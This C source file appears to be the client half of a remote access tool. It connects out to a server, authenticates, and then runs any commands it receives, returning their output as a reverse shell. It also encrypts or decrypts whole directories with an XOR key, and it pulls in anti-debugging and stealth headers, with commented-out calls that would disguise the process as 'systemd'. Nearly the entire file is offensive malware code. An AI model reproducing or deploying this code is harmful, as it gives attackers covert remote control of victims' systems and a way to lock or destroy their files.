#include "client_base.h"
#include "anti_debug.h"
#include "stealth.h"
#include "crypto.h"
#include "postexp.h"

#define DEFAULT_PORT 8080
#define DEFAULT_IP "127.0.0.1"
#define BUFFER_SIZE 1024

void send_shell_type(int sockfd) {
    const char *shell = access("/bin/bash", X_OK) == 0 ? "/bin/bash" : "/bin/sh";
    if (send(sockfd, shell, strlen(shell), 0) < 0) {
        perror("Error sending shell type to server");
    } else {
        printf("Sent shell type: %s\n", shell);
    }
}

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in server_addr;
    char ip[BUFFER_SIZE] = DEFAULT_IP;
    int port = DEFAULT_PORT;
    char password[BUFFER_SIZE] = "";
    char xor_key[BUFFER_SIZE] = "mysecretpass1";
    char *encrypt_dir = NULL, *decrypt_dir = NULL;

    int opt;
    while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
        switch (opt) {
            case 'i':
                strncpy(ip, optarg, BUFFER_SIZE);
                break;
            case 'p':
                port = atoi(optarg);
                break;
            case 'w':
                strncpy(password, optarg, BUFFER_SIZE);
                break;
            case 'e':
                encrypt_dir = optarg;
                break;
            case 'd':
                decrypt_dir = optarg;
                break;
            case 'k':
                strncpy(xor_key, optarg, BUFFER_SIZE);
                break;
            default:
                print_usage(argv[0]); // Call from client_base.c
                exit(EXIT_FAILURE);
        }
    }

    if (encrypt_dir && decrypt_dir) {
        fprintf(stderr, "Error: Cannot specify both -e (encrypt) and -d (decrypt) simultaneously.\n");
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (encrypt_dir) {
        printf("Encrypting files in directory: %s\n", encrypt_dir);
        process_directory(encrypt_dir, xor_key, 0); // Encryption mode
        return 0;
    }

    if (decrypt_dir) {
        printf("Decrypting files in directory: %s\n", decrypt_dir);
        process_directory(decrypt_dir, xor_key, 1); // Decryption mode
        return 0;
    }

    // Anti-debugging measures
    // anti_debug_ptrace();
    // anti_debug_proc();

    // Stealth measures
    // rename_process("systemd");
    // change_cmdline("systemd");

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        error_exit("Error creating socket");
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        error_exit("Invalid IP address");
    }

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        error_exit("Connection to server failed");
    }
    printf("Connected to server at %s:%d\n", ip, port);

    // Authenticate with the server
    if (!authenticate(sockfd, password)) {
        close(sockfd);
        return 1;
    }

    // Send shell type to the server
    send_shell_type(sockfd);

    // Main loop for receiving and executing commands
    char command_buffer[BUFFER_SIZE];
    while (1) {
        ssize_t bytes_received = recv(sockfd, command_buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            perror("Error receiving command or connection closed by server");
            break;
        }

        command_buffer[bytes_received] = '\0';
        printf("Received command: %s\n", command_buffer);

        if (strcmp(command_buffer, "exit") == 0) {
            printf("Exiting on server request...\n");
            break;
        }

        // Execute the received command and send the output back
        execute_command_and_send_output(command_buffer, sockfd);
    }

    close(sockfd);
    printf("Disconnected from server.\n");
    return 0;
}